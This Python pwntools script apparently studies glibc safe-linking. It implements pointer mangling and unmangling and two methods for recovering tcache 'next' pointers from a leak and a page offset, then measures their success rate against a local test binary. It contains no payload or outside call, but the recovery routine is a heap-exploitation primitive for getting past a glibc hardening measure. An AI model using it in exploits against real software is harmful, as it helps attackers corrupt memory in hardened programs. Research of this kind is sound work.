from pwn import *
def safe_link_unpack(leaked):
    # split to four parts(12bits)
    des = []
    for _ in range(4):
        des.append(leaked & (0xfff))
        leaked = leaked >> 12
    des = des[::-1]
    # reveal the original addr
    res = 0 
    pre = 0 
    for _ in range(4):
        pre = des[_] ^ pre
        res = res << 12
        res |= pre
    return res
def safe_link_pack(addr):
    if((addr>>48)==0):
        des =  [] 
        for _ in range(4):
            des.append(addr & (0xfff))
            addr = addr >> 12
        des = des[::-1]
        res = 0 
        pre = 0 
        for _ in range(4):
            tmp = des[_] ^ pre
            pre = des[_]
            res = res << 12
            res |= tmp
        return res
    else:
        return (addr>>12)^addr
def I(leaked,page_off=4):    
    # Success rate: 0.5 
    # For exmaple, 
    # 0x555556000c90 -> 0x5555555592a0
    # Leaked = 0x000055500000f2a0
    #             0x0000555556000
    #          0x00005555555592a0
    # page_off = 0xaa7 (x1 = 0, x2 = 0, x3 = aa7)
    # However,
    # A(555)+x1(0) = E(555) [+]
    # B(555)+x2(0)!= F(556) [-]
    # C(559)+x3(AA7) = 0x1000 != G(000) [-]

    # so the page_off aa7 could be the result of (0,0,+aa7) or (0,+1,-559)
    # We can't know which one is the correct one because aa7 is applied on 
    '''
    Assume the true address of next is: A|B|C|D, where len(A)=len(B)=len(C)=len(D)=12bits
    and current tcache node's page address is: E|F|G, where len(E) ..... = 12bits
    Known Info:
    {
        EFG - ABC = page_off
        A | B ^ E | C ^ F | D ^ G = leaked 
    }
    Prove:
    {
        We can reveal A|B|C|D from Known Info
    }
    Because:
    {
        A = leaked >> 36,
        Set:
        {
            // Partial of this section is wrong
            // 
            A+x1 = E
            B+x2 = F
            C+x3 = G
        where:
            x1 = page_off>>24
            x2 = (page_off>>12)&0xfff
            x3 = page_off&0xfff
        }
        {
            Easy to get:
            A = leaked >> 36
            E = A + (page_off>>24)
            E = E & 0xfff
            B = ((leaked>>24)&0xfff) ^ E
            F = B + ((page_off>>12)&0xfff)
            F = F & 0xfff
            C = ((leaked>>12)&0xfff) ^ F
            G = (C + (page_off&0xfff))
            G = G & 0xfff
            D = (leaked & 0xfff) ^ G
            res = (A<<36) | (B <<24) | (C<<12) | D
        }
        So if we known page_off set, safe link is not safe.
        And page_off is 
        1. easy to get 
        2. easy to guess + brute force
        
        All: Page_off increases the complexity of Linux and provide a little security protection. 
    }
    '''
    A = leaked >> 36
    E = A + (page_off>>24)
    E = E & 0xfff
    B = ((leaked>>24)&0xfff) ^ E
    F = B + ((page_off>>12)&0xfff)
    F = F & 0xfff
    C = ((leaked>>12)&0xfff) ^ F
    G = (C + (page_off&0xfff))
    G = G & 0xfff
    D = (leaked & 0xfff) ^ G
    res = (A<<36) | (B <<24) | (C<<12) | D
    return res
def II(leaked,page_off=4, orecal = 0x2a0):    
    # Success rate: 0.5 
    # For exmaple, 
    # 0x555556000c90 -> 0x5555555592a0
    # Leaked = 0x000055500000f2a0
    #             0x0000555556000
    #          0x00005555555592a0
    # page_off = 0xaa7 (x1 = 0, x2 = 0, x3 = aa7)
    # However,
    # A(555)+x1(0) = E(555) [+]
    # B(555)+x2(0)!= F(556) [-]
    # C(559)+x3(AA7) = 0x1000 != G(000) [-]
    # 
    # And I find that i foget a known fact: D is known, so G = D ^ (D ^G )
    # And (EFG - ABC) = page_off(X1|X2|X3)
    # if G is less than X3, i.g. G(000)< x3(AA7), X3 may be wrong, the real x3 should be 
    # x3 = 0x1000 - x3 =  0x559
    # x2 = x2 + 1 = 1
    # Base on this we can conquere it totally!
    '''
    Known Info:
    {
        A+x1 = E
        B+x2 = F
        C+x3 = G
        A
        B ^ E
        C ^ F
        D ^ G
        D
    }
    Prove:
    {
        We can reveal A|B|C|D from Known Info
    }
    Because:
    {
        A = leaked >> 36
        D = D (Even with aslr on, the off of the doesn't change)
        G = D ^ G ^ D = (leaked & 0xfff) ^ D
    }
    '''
    x1 = (page_off >> 24)
    x2 = ((page_off >> 12) & 0xfff)
    x3 = (page_off & 0xfff)
    A = leaked >> 36
    D = orecal
    G = (leaked & 0xfff) ^ D
    if(x3>G):
        JW1 = 1
    else:
        JW1 = 0 
    
    C = G + 0x1000 * JW1 - x3
    F = ((leaked>>12)&0xfff) ^ C

    if( x2 > F-JW1 ):
        JW2 = 1
    else:
        JW2 = 0 
    B = F-JW1 + 0x1000 * JW2 - x2
    # print(hex(leaked),hex(page_off),hex(JW2),hex(F))
    res = (A<<36) | (B <<24) | (C<<12) | D
    return res
def one(ct):
    p = process("./main")
    p.sendline(str(ct).encode())
    leaked = int(p.readline(),16)
    page_off = int(p.readline(),16)
    orecal = int(p.readline(),16)
    try:
        OOO = int(p.readline(),16)
    except:
        OOO = 0
    p.close()
    X = II(leaked,page_off,OOO)
    if(orecal == X):
        return 1
    return 0

if __name__ == "__main__":
    win = 0 
    T = 0x1000
    S = 1
    for x in range(S,T):
        win+=one(x)
    print(win/(T-S))
